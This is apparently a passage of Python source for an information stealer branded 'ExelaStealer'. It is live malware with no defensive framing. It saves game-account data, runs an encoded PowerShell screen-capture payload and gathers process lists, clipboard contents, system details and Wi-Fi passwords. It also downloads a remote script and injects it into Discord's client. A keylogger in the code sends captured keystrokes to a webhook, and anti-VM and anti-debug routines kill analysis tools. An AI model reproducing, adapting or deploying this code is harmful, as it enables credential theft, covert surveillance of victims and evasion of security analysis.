                with open(tmp + f"\\{run}\\Steam\\Steam.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for st in self.steamm:
                        q.write(str(st) + "\n")
            if self.roblox==True:
                os.mkdir(tmp + f"\\{run}\\Roblox")
                with open(tmp + f"\\{run}\\Roblox\\Roblox.txt", "a", encoding="utf-8", errors="ignore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for robl in self.robloxx:
                        q.write(str(robl))
            if not self.growtopia == 0:
                os.mkdir(tmp + f"\\{run}\\Growtopia")
                with open(tmp + f"\\{run}\\Growtopia\\Growtopia.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for gw in self.growtopiaa:
                        q.write(str(gw) + "\n")
            if 5 < 10:
                command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
                subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= tmp + f"\\{run}")
            if 0 < 1:
                active_window_title = self.get_active_window_title()
                with open(tmp + f"\\{run}\\active_window.txt", "a", encoding="utf-8", errors="ignore") as x:
                    x.write(str(active_window_title))
            if 7<15:
                try:
                    process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
                    output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
                    with open(tmp + f"\\{run}\\process_list.txt", "w",encoding="utf-8", errors="ignore") as process_list:
                        process_list.write(output)
                except:
                    pass
            if 5 > 4:
                self.get_last_clipboard_text(run)
                self.get_last_clipboard_image(run)
            if 45 > 3:
                with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
                    micro.write("----------------------https://t.me/ExelaStealer----------------------\n======================================================================\n")
                if mic_data:
                    with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
                        micro.write("Listed Microphone's\n======================================================================\n")
                    for mics in mic_data:
                        with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
                            micro.write("Listed Microphone's\n" + mics + "\n")
                self.get_all_system_data()
            if 7855 < 8888:
                self.GetWifiPasswords(tmp + f"\\{run}")
class DiscordInjection:
    def __init__(self) -> None:
        self.local_appdata = os.getenv("LOCALAPPDATA")
        self.discord_path = os.path.join(self.local_appdata, "Discord")
        if os.path.isdir(self.discord_path):
            self.callBack()
        else:return
    def callBack(self):
        self.kill_dc()
        self.write_injection()
        self.start_dc()
    def find_index_path(self) -> str:
        if not os.path.isdir(self.discord_path):
            return
        else:
            for file in os.listdir(self.discord_path):
                if re.search(r'app-+?', file):
                    modules_dir = os.path.join(self.discord_path,file, "modules")
                    for modules_files in os.listdir(modules_dir):
                        if re.search(r'discord_desktop_core-+?', modules_files):
                            core_path = os.path.join(modules_dir, modules_files, "discord_desktop_core")
                            index_path = os.path.join(core_path, "index.js")
                            if os.path.isfile(index_path):
                                return index_path
    def get_injection_code(self) -> str:
        code = requests.get("https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js").text
        replaced_code = code.replace("%WEBHOOK%",UrLxD)
        return replaced_code
    def write_injection(self):
        file_path = self.find_index_path()
        get_injection_code = self.get_injection_code()
        with open(file_path, "w", encoding="utf-8", errors="ignore") as lol:
            lol.write(get_injection_code)
    def kill_dc(self):
        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()
    def start_dc(self):
        command = os.path.join(self.discord_path, "Update.exe") + " --processStart Discord.exe"
        subprocess.run(command, shell=True)   
class KeyboardLogger:
    def __init__(self, output_file, webhook_url) -> None:
        self.output_file = output_file
        self.caps_lock_active = False
        self.total_keys = 0
        self.webhook_url = webhook_url
        self.running = True
    def format_key(self, key):
        if isinstance(key, keyboard.KeyCode):
            return key.char if key.char else str(key.vk)
        else:
            return str(key)       
    def on_key_press(self, key):
        try:
            with open(self.output_file, 'a', encoding='utf-8', errors="ignore") as f:
                if key == keyboard.Key.space:
                    f.write(' ')
                elif key == keyboard.Key.enter:
                    f.write('\n')
                elif key == keyboard.Key.caps_lock:
                    self.caps_lock_active = not self.caps_lock_active
                    if self.caps_lock_active:
                        f.write('[caps_lock_on]')
                    else:
                        f.write('[caps_lock_off]')
                elif key == keyboard.Key.f1:
                    f.write('[F1]')
                elif key == keyboard.Key.f2:
                    f.write('[F2]')
                elif key == keyboard.Key.f3:
                    f.write('[F3]')
                elif key == keyboard.Key.f4:
                    f.write('[F4]')
                elif key == keyboard.Key.f5:
                    f.write('[F5]')
                elif key == keyboard.Key.f6:
                    f.write('[F6]')
                elif key == keyboard.Key.f7:
                    f.write('[F7]')
                elif key == keyboard.Key.f8:
                    f.write('[F8]')
                elif key == keyboard.Key.f9:
                    f.write('[F9]')
                elif key == keyboard.Key.f10:
                    f.write('[F10]')
                elif key == keyboard.Key.f11:
                    f.write('[F11]')
                elif key == keyboard.Key.f12:
                    f.write('[F12]')
                elif key == keyboard.Key.home:
                    f.write('[Home]')
                elif key == keyboard.Key.end:
                    f.write('[End]')
                elif key == keyboard.Key.page_up:
                    f.write('[PageUp]')
                elif key == keyboard.Key.page_down:
                    f.write('[PageDown]')
                elif key == keyboard.Key.up:
                    f.write(str('↑'))
                elif key == keyboard.Key.down:
                    f.write(str('↓'))
                elif key == keyboard.Key.right:
                    f.write(str('→'))
                elif key == keyboard.Key.left:
                    f.write(str('←'))
                elif key == keyboard.Key.backspace:
                    f.write("[back_space]")
                elif key == keyboard.Key.esc:
                    f.write("esc ")
                else:
                    char = self.format_key(key).upper() if self.caps_lock_active else self.format_key(key).lower()
                    f.write(f'{char}')
                    self.total_keys += 1  
                    if self.total_keys >= 300:
                        self.send_webhook()
        except AttributeError:
            with open(self.output_file, 'a', encoding='utf-8', errors="ignore") as f:
                if key == keyboard.Key.space:
                    f.write(' ')
                elif key == keyboard.Key.enter:
                    f.write('\n')
                elif key == keyboard.Key.caps_lock:
                    self.caps_lock_active = not self.caps_lock_active
                    if self.caps_lock_active:
                        f.write('[caps_lock_on]')
                    else:
                        f.write('[caps_lock_off]')
                elif key == keyboard.Key.f1:
                    f.write('[F1]')
                elif key == keyboard.Key.f2:
                    f.write('[F2]')
                elif key == keyboard.Key.f3:
                    f.write('[F3]')
                elif key == keyboard.Key.f4:
                    f.write('[F4]')
                elif key == keyboard.Key.f5:
                    f.write('[F5]')
                elif key == keyboard.Key.f6:
                    f.write('[F6]')
                elif key == keyboard.Key.f7:
                    f.write('[F7]')
                elif key == keyboard.Key.f8:
                    f.write('[F8]')
                elif key == keyboard.Key.f9:
                    f.write('[F9]')
                elif key == keyboard.Key.f10:
                    f.write('[F10]')
                elif key == keyboard.Key.f11:
                    f.write('[F11]')
                elif key == keyboard.Key.f12:
                    f.write('[F12]')
                elif key == keyboard.Key.home:
                    f.write('[Home]')
                elif key == keyboard.Key.end:
                    f.write('[End]')
                elif key == keyboard.Key.page_up:
                    f.write('[PageUp]')
                elif key == keyboard.Key.page_down:
                    f.write('[PageDown]')
                elif key == keyboard.Key.up:
                    f.write(str('↑'))
                elif key == keyboard.Key.down:
                    f.write(str('↓'))
                elif key == keyboard.Key.right:
                    f.write(str('→'))
                elif key == keyboard.Key.left:
                    f.write(str('←'))
                elif key == keyboard.Key.backspace:
                    f.write("[back_space]")
                elif key == keyboard.Key.esc:
                    f.write("esc ")
                else:
                    char = self.format_key(key).upper() if self.caps_lock_active else self.format_key(key).lower()
                    f.write(f'{char}')
                    
                    self.total_keys += 1  # Tuş sayısını artır

                    # Kontrol ve gönderme işlemi
                    if self.total_keys >= 300:
                        self.send_webhook()
    def send_webhook(self):
        print("sendings")
        if os.path.exists(self.output_file) and self.total_keys >= 300:
            with open(self.output_file, 'r',encoding="utf-8", errors="ignore") as file:
                payload = {
                    'file': (self.output_file, file)
                }
                response = requests.post(self.webhook_url, files=payload)
                if response.status_code == 200:
                    print("log send succesfully.")
                else:
                    print("log cant send.")
                self.total_keys = 0
                with open(self.output_file, 'w',encoding="utf-8", errors="ignore") as file:
                    file.write("") # clear logs
    def start_logging(self):
        with keyboard.Listener(on_press=self.on_key_press) as listener:
            listener.join()
class HardAntiVM:
    def __init__(self) -> None:
        if self.is_running_on_vm():
            print("VM Detected")
            os._exit(0)
        else:
            print("Normal Machine")
            thread = threading.Thread(target=QuicaxdExela,daemon=True)
            thread.start()
            thread.join()
    def is_running_on_vm(self):
        detection_methods = [
        self.normalVM,
        self.vmcik,
        self.check_hostname,
        self.check_processes,
        self.check_files,
        self.check_gdb,
        self.check_cursor_position,
        self.check_hypervisor,
        self.sandboxie,
    ]
        for method in detection_methods:
            if method():
                print(method)
                return True
        return False
    def check_hostname(self):
        try:
            hostNames = ['sandbox','cuckoo', 'vm', 'virtual', 'qemu', 'vbox', 'xen']
            hostname = platform.node().lower()
            for name in hostNames:
                if name in hostname:
                    return True
            return False
        except:
            return False
    def check_processes(self):
        try:
            banned_processes = [
            "vmtoolsd.exe",     # VMware
            "vmwaretray.exe",   # VMware
            "vmacthlp.exe",     # VMware
            "vboxtray.exe",     # VirtualBox
            "vboxservice.exe",  # VirtualBox
            "vmsrvc.exe",       # VirtualBox
            "prl_tools.exe",    # Parallels
            "xenservice.exe",   # Xen
                            ]           
            for process in psutil.process_iter(['name']):
                if process.info['name'].lower() in banned_processes:
                    return True
            return False
        except:
            return False
    def check_files(self):
        try:
            banned_files = [
                "\\Device\\Harddisk0\\DR0",     # VMware
                "\\Device\\Harddisk0\\DR1",     # VirtualBox
                "\\Device\\Harddisk0\\DR2",     # Parallels
                "\\Device\\Harddisk0\\DR3",     # Xen
                ]      
            for file in banned_files:
                if os.path.exists(file):
                    return True
            return False 
        except:
            return False
    def check_gdb(self):
        try:
            output = subprocess.check_output(["gdb", "--version"], shell=True, timeout=5)
            if b"GDB" in output:
                return True
        except:
            pass
        return False
    def check_cursor_position(self):
        try:
            x, y = win32api.GetCursorPos()
            if x == 0 and y == 0:
                return True
            
            return False
        except:
            return False
    def check_hypervisor(self):
        try:
            output = subprocess.check_output(["systeminfo"], stderr=subprocess.STDOUT, shell=True)
            output2 = subprocess.check_output('wmic computersystem get Manufacturer', shell=True, stderr=subprocess.STDOUT)
            output3 = subprocess.check_output('wmic path Win32_ComputerSystem get Manufacturer', shell=True, stderr=subprocess.STDOUT).decode().lower()
            if b"Hypervisor" in output:
                return True
            elif b'VMware' in output2:
                return True
            elif "vmware" in output3:
                return True
        except:
            return False
    def normalVM(self):
        try:
            banned_bios_manufacturers = [
                "VMware",
                "VirtualBox",
                "Xen",
            ]
            bios_manufacturer = self.get_bios_manufacturer()
            if bios_manufacturer:
                for manufacturer in banned_bios_manufacturers:
                    if manufacturer.lower() in bios_manufacturer.lower():
                        return True

            return False
        except:
            return False
    def get_bios_manufacturer(self):
        try:
            c = wmi.WMI()
            bios = c.Win32_BIOS()[0]
            return bios.Manufacturer
        except:
            return ""
    def sandboxie(self):
        try:
            handle = ctypes.windll.LoadLibrary("SbieDll.dll")
        except:
            return False
        else:
            return True
    def vmcik(self):
        try:
            objWmi = wmi.WMI()
            for diskDrive in objWmi.query("Select * from Win32_DiskDrive"):
                if "vbox" in diskDrive.Caption.lower() or "virtual" in diskDrive.Caption.lower():
                    return True
                else:
                    return False   
        except:
            return False             
class AntiDebug:
    def __init__(self) -> None:
        self.banned_uuids = ["7AB5C494-39F5-4941-9163-47F54D6D5016","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "71DC2242-6EA2-C40B-0798-B4F5B4CC8776", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
                            "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"]
        self.banned_computer_names = ["WDAGUtilityAccount","JOANNA","WINZDS-21T43RNG", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
                            "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
                            "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R","COMPNAME_4491", "WILEYPC", "WORK","KATHLROGE","DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC","DESKTOP-NNSJYNR", "JULIA-PC","DESKTOP-BQISITB", "d1bnJkfVlH"]
        self.banned_process = ["httpdebuggerui","node","cmd","wireshark", "fiddler", "regedit", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
                                     "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
        self.calback()
    def calback(self):
        self.check_system()
        self.kill_process()
    def check_system(self):
        get_uuid = str(subprocess.check_output("wmic csproduct get uuid", shell=True).decode('utf-8').split("\n")[1].strip())
        get_computer_name = os.getenv("computername")    
        for uuid in self.banned_uuids:
            if uuid in get_uuid:
                print("hwid detected")
                os._exit(0)
        for compName in self.banned_computer_names:
            if compName in get_computer_name:
                print("computer name detected")
                os._exit(0)
    def kill_process(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.banned_process):
                try:
                    proc.kill()
                except:
                    pass   
def injectKeyloggers():
    if injectKeylogger == "%keyloggertrue%":
        try:
            path = os.getenv('temp')
            outputFile = path + "\\key_logs.txt"
            if os.path.isfile(outputFile):
                os.remove(outputFile)
            logger = KeyboardLogger(outputFile, UrLxD)
            logger.start_logging()
        except Exception as e:
            print(str(e))
def inject_dc():
    if inject_discord == "true":
            DiscordInjection()
def callAllFunctions():
    try:
        AntiDebug()
        if Anti_Vm == "false":
            thread = threading.Thread(target=QuicaxdExela,daemon=True)
            thread.start()
            thread.join()
        else:
            HardAntiVM()
        inject_dc()
        injectKeyloggers()
    except:
        pass
if __name__ == "__main__":
    if not create_mutex("Exela"):
        print("mutex already exist")
        os._exit(0)
    else:
        print("mutex created")
        callAllFunctions()
